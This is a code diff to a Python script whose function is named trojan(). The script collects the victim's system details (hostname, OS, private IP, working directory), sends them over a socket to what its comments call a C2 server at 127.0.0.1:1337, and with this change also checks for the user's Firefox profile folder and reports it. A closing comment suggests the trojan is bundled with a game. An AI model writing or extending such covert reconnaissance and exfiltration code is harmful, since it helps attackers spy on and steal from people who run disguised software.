@@ -1,13 +1,13 @@
-import socket
-import multiprocessing
 import os
 import random
 import asyncio
+import socket
 
 async def trojan():
+    # Create a socket object
     client = socket.socket()
 
-    # Gather basic system information using os module 
+    # Gather basic system information using os module
     system_info = {}
     system_info['system'] = os.name
     system_info['hostname'] = os.uname().nodename
@@ -17,23 +17,29 @@ async def trojan():
     system_info['private_ip'] = socket.gethostbyname(socket.getfqdn())
     system_info['current_directory'] = os.getcwd()
 
+    # Server address and port
     serv_addr = "127.0.0.1"
     port = 1337
 
-    try:
-        client.connect((serv_addr, port))
-    except Exception as e:
-        print("[Error] Is The Host Really Up? Try Checking The Host And Port.")
-        print(f"LOG:\n{e}")
-        exit(1)
+    # Path to the Firefox directory
+    path = f"{os.path.expanduser('~')}/.mozilla/firefox/"
 
+    # Connect to the server
+    client.connect((serv_addr, port))
+
+    # Prepare system information as a string
     data = '\n'.join(f'{key}: {value}' for key, value in system_info.items())
 
-    client.sendall(data.encode())  # Send it to the C2 server
+    # Send system information to the C2 server
+    client.sendall(data.encode())
 
-    response = client.recv(2048).decode()
-    print(response)
+    # Check if Firefox is installed
+    if os.path.exists(path):
+        client.sendall("\nFirefox Is Installed!".encode())
+    else:
+        client.sendall("\nFirefox is Not Installed!".encode())
 
+    # Close the connection
     client.close()
 
 # A game stolen from my other project
